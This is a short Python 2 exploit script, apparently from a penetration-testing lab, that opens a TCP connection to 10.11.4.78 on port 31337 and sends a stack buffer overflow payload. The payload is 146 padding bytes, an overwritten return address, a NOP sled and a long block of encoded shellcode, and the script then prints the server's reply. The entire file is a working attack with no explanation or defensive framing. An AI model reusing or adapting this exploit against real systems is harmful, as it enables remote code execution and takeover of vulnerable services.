#!/usr/bin/env python2
import socket

# setup the IP and port we're connecting to
RHOST = "10.11.4.78"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# build the message

buf = ""
buf += "A"*146
buf += "\xc3\x14\x04\x08"
buf += "\x90"*16

buf += "\xdb\xcf\xd9\x74\x24\xf4\xbd\x93\x1d\xfd\x94\x58\x33"
buf += "\xc9\xb1\x52\x31\x68\x17\x03\x68\x17\x83\x53\x19\x1f"
buf += "\x61\xaf\xca\x5d\x8a\x4f\x0b\x02\x02\xaa\x3a\x02\x70"
buf += "\xbf\x6d\xb2\xf2\xed\x81\x39\x56\x05\x11\x4f\x7f\x2a"
buf += "\x92\xfa\x59\x05\x23\x56\x99\x04\xa7\xa5\xce\xe6\x96"
buf += "\x65\x03\xe7\xdf\x98\xee\xb5\x88\xd7\x5d\x29\xbc\xa2"
buf += "\x5d\xc2\x8e\x23\xe6\x37\x46\x45\xc7\xe6\xdc\x1c\xc7"
buf += "\x09\x30\x15\x4e\x11\x55\x10\x18\xaa\xad\xee\x9b\x7a"
buf += "\xfc\x0f\x37\x43\x30\xe2\x49\x84\xf7\x1d\x3c\xfc\x0b"
buf += "\xa3\x47\x3b\x71\x7f\xcd\xdf\xd1\xf4\x75\x3b\xe3\xd9"
buf += "\xe0\xc8\xef\x96\x67\x96\xf3\x29\xab\xad\x08\xa1\x4a"
buf += "\x61\x99\xf1\x68\xa5\xc1\xa2\x11\xfc\xaf\x05\x2d\x1e"
buf += "\x10\xf9\x8b\x55\xbd\xee\xa1\x34\xaa\xc3\x8b\xc6\x2a"
buf += "\x4c\x9b\xb5\x18\xd3\x37\x51\x11\x9c\x91\xa6\x56\xb7"
buf += "\x66\x38\xa9\x38\x97\x11\x6e\x6c\xc7\x09\x47\x0d\x8c"
buf += "\xc9\x68\xd8\x03\x99\xc6\xb3\xe3\x49\xa7\x63\x8c\x83"
buf += "\x28\x5b\xac\xac\xe2\xf4\x47\x57\x65\xf1\x9c\x57\x20"
buf += "\x6d\xa1\x57\xd4\xab\x2c\xb1\x82\x23\x79\x6a\x3b\xdd"
buf += "\x20\xe0\xda\x22\xff\x8d\xdd\xa9\x0c\x72\x93\x59\x78"
buf += "\x60\x44\xaa\x37\xda\xc3\xb5\xed\x72\x8f\x24\x6a\x82"
buf += "\xc6\x54\x25\xd5\x8f\xab\x3c\xb3\x3d\x95\x96\xa1\xbf"
buf += "\x43\xd0\x61\x64\xb0\xdf\x68\xe9\x8c\xfb\x7a\x37\x0c"
buf += "\x40\x2e\xe7\x5b\x1e\x98\x41\x32\xd0\x72\x18\xe9\xba"
buf += "\x12\xdd\xc1\x7c\x64\xe2\x0f\x0b\x88\x53\xe6\x4a\xb7"
buf += "\x5c\x6e\x5b\xc0\x80\x0e\xa4\x1b\x01\x3e\xef\x01\x20"
buf += "\xd7\xb6\xd0\x70\xba\x48\x0f\xb6\xc3\xca\xa5\x47\x30"
buf += "\xd2\xcc\x42\x7c\x54\x3d\x3f\xed\x31\x41\xec\x0e\x10"
buf += "\n"

# send message
s.send(buf)
print "Send: {0}".format(buf)

# receive response
data = s.recv(1024)
print "Received: {0}".format(data)

